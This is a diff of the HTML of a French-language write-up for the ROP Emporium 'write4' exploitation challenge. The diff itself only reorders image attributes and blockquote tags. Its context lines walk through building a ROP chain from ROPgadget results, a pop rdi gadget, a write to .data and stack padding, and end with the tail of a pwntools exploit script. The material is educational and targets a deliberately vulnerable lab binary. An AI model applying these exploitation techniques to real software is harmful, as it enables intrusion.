@@ -195,7 +195,7 @@ A PLT entry for a function named print_file() exists within the challenge binary
 </span></span></code></pre></div><p>Comme pour le précédent, <strong>NX</strong> est activé donc pas de shellcode, mais ce n&rsquo;est pas un problème puisque la description de l&rsquo;exercice nous indique exactement quoi faire</p>
 <h2 id="exploitation">Exploitation</h2>
 <p>On va le lancer pour voir ce qu&rsquo;il fait concrètement:</p>
-<p><img alt="2023-01-21-151701_1046x476_scrot" src="https://user-images.githubusercontent.com/77807503/213875956-5f7e3f8e-3d1e-42a1-b4f6-53168ef66fb4.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/213875956-5f7e3f8e-3d1e-42a1-b4f6-53168ef66fb4.png" alt="2023-01-21-151701_1046x476_scrot"></p>
 <p>On voit que si on entre un nombre élevé de bytes dans l&rsquo;input le programme plante (<code>segfault</code>), ce qui veut dire qu&rsquo;on a commencé à overwrite des registres.</p>
 <p>Cette fois pas besoin de désassembler les fonctions puisqu&rsquo;on sait exactement ce qu&rsquo;il faut faire, on peut commencer à ressembler les élements nécessaires pour construire notre payload.</p>
 <p>Commençons par regarder les sections de l&rsquo;executable pour en trouver une dans laquelle on va pouvoir écrire:</p>
@@ -242,20 +242,17 @@ A PLT entry for a function named print_file() exists within the challenge binary
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400601</span> : mov rbp, rsp ; pop rbp ; jmp <span style="color:#ae81ff">0x400590</span>
 </span></span></code></pre></div><p>On voit un <code>mov qword ptr [r14], r15 ; ret</code> à l&rsquo;adresse <code>0x00400628</code>, encore une fois exactement ce qu&rsquo;il nous faut.</p>
 <blockquote>
-<p>L&rsquo;instruction <code>mov</code> déplace le cotenu du second registre dans le premier, en l&rsquo;occurence ici, il déplace la valeur de r15 dans l&rsquo;adresse dans r14 (grâce au <code>qword ptr</code>)</p>
-</blockquote>
+<p>L&rsquo;instruction <code>mov</code> déplace le cotenu du second registre dans le premier, en l&rsquo;occurence ici, il déplace la valeur de r15 dans l&rsquo;adresse dans r14 (grâce au <code>qword ptr</code>)</p></blockquote>
 <p>Mais il nous manque encore un gadget! Si on regarde attentivement la description du challenge, on voit qu&rsquo;il existe un fonction <code>print_file()</code> qui prend en argument le nom d&rsquo;un fichier. Le string qu&rsquo;on va écrire dans <code>.data</code> va donc être <code>flag.txt</code> et plus <code>&quot;/bin/cat flag.txt&quot;</code>.</p>
 <blockquote>
 <p>Rappel: En 64bit, les fonctions prennent leurs arguments dans les registres <code>rdi</code>, <code>rsi</code>, <code>rdx</code>, <code>rcx</code>&hellip; (vous pouvez trouver la liste des registres <a href="https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/linux-x64-calling-convention-stack-frame">ici</a>).
-Donc, en modifiant <code>rdi</code> et en plaçant l&rsquo;adresse de <code>.data</code> dedans, la fonction <code>print_file()</code> prendra notre string en premier argument</p>
-</blockquote>
+Donc, en modifiant <code>rdi</code> et en plaçant l&rsquo;adresse de <code>.data</code> dedans, la fonction <code>print_file()</code> prendra notre string en premier argument</p></blockquote>
 <p>Nous avons donc besoin d&rsquo;un <code>pop rdi</code> !</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ROPgadget <span style="color:#f92672">--</span>binary write4 <span style="color:#f92672">|</span> grep <span style="color:#e6db74">&#34;pop rdi ; ret&#34;</span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400693</span> : pop rdi ; ret 
 </span></span></code></pre></div><p>Parfait, il nous faut maintenant deux dernières choses: l&rsquo;adresse de la fonction <code>print_file()</code> et le padding nécessaire pour réecrire la sauvegarde de <code>rip</code>.</p>
 <blockquote>
-<p>Puisque PIE n&rsquo;est pas activé, on peut trouver statiquement l&rsquo;adresse de <code>print_file</code>, si il était activé, nous aurions dû le contourner, par exemple en trouvant la base address de l&rsquo;executable</p>
-</blockquote>
+<p>Puisque PIE n&rsquo;est pas activé, on peut trouver statiquement l&rsquo;adresse de <code>print_file</code>, si il était activé, nous aurions dû le contourner, par exemple en trouvant la base address de l&rsquo;executable</p></blockquote>
 <p>Commençons par trouver l&rsquo;adresse de <code>print_file()</code> avec <code>pwndbg</code>:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> info functions
 </span></span><span style="display:flex;"><span>All defined functions:
@@ -316,8 +313,7 @@ Donc, en modifiant <code>rdi</code> et en plaçant l&rsquo;adresse de <code>.dat
 </span></span><span style="display:flex;"><span>End of assembler dump<span style="color:#f92672">.</span>
 </span></span></code></pre></div><blockquote>
 <p>J&rsquo;ai désassemblé la fonction en débuggant l&rsquo;executable puisqu&rsquo;elle était vide tant que le programme n&rsquo;était pas lancé
-Pour reproduire ceci, mettez un breakpoint au début de la fonction puis avancez dans l&rsquo;éxecution jusqu&rsquo;au <code>read</code>, puis désassemblez <code>pwnme</code></p>
-</blockquote>
+Pour reproduire ceci, mettez un breakpoint au début de la fonction puis avancez dans l&rsquo;éxecution jusqu&rsquo;au <code>read</code>, puis désassemblez <code>pwnme</code></p></blockquote>
 <p>On voit que le buffer est situé à <code>rbp-0x20</code> et que la fonction <code>read</code> va lire <code>0x200</code> bytes d&rsquo;input, ce qui est largement assez. Pour réecrire la sauvegarde de <code>rip</code>, il nous faut <code>0x8</code> bytes de plus que le buffer, donc notre padding total sera de <code>(0x20+0x8)</code> bytes.</p>
 <p>Puisque je suis toujours sous Ubuntu, on peut s&rsquo;attendre à des problèmes de stack alignment donc je vais ajouter un <code>ret</code> juste après mon padding</p>
 <h2 id="final-payload">Final Payload</h2>
@@ -361,7 +357,7 @@ Pour reproduire ceci, mettez un breakpoint au début de la fonction puis avancez
 </span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
 </span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Flag:&#34;</span>,p<span style="color:#f92672">.</span>recvall()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
 </span></span></code></pre></div><p>Puis on peut le tester pour s&rsquo;assurer qu&rsquo;il fonctionne:</p>
-<p><img alt="2023-01-21-160402_1111x283_scrot" src="https://user-images.githubusercontent.com/77807503/213875961-819be98f-e699-4a60-8fe7-45caa64e25ac.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/213875961-819be98f-e699-4a60-8fe7-45caa64e25ac.png" alt="2023-01-21-160402_1111x283_scrot"></p>
 <p>Parfait, on a le flag!</p>
 
       </div>
